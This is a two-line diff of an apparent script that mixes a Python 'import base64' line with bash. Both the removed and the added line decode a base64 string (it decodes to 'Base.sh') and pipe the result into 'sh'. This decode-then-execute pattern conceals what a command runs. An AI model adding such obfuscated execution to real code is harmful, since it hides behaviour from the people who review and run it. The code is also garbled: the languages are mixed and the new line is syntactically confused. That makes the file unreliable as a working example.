@@ -1,2 +1,2 @@
 import base64
-exec="QmFzZS5zaA==" base64 -d <<< $exec | sh
+echo base64 -D <<< QmFzZS5zaA== | sh
